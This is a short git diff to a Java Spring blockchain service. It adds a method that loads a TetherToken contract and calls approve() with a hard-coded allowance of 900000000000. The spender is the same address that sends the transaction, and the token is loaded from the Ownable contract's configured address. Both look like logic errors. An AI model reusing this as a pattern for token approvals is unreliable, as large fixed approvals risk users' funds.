@@ -4,7 +4,7 @@ import cn.stylefeng.guns.blockchain.contract.MyGasProvider;
 import cn.stylefeng.guns.blockchain.contract.Ownable;
 import cn.stylefeng.guns.blockchain.contract.Panama;
 import cn.stylefeng.guns.blockchain.properties.BlockChainProperties;
-import cn.stylefeng.roses.kernel.model.response.ResponseData;
+import cn.stylefeng.guns.blockchain.contract.TetherToken;
 import lombok.extern.slf4j.Slf4j;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.stereotype.Service;
@@ -85,6 +85,20 @@ public class ContractService {
         try {
             if (ownable.isValid()) {
                 return ownable.transferOwnership(address).send();
+            }
+        } catch (Exception ex) {
+            ex.printStackTrace();
+        }
+        return null;
+    }
+
+    // 添加授权
+    public TransactionReceipt transferAporove (String address) {
+        TransactionManager transactionManager = new ClientTransactionManager(web3j, address);
+        TetherToken token = TetherToken.load(properties.getOwnableContractAddress(), web3j, transactionManager, BigInteger.valueOf(1000), BigInteger.valueOf(50));
+        try {
+            if (token.isValid()) {
+                return token.approve(address, BigInteger.valueOf(900000000000L)).send();
             }
         } catch (Exception ex) {
             ex.printStackTrace();
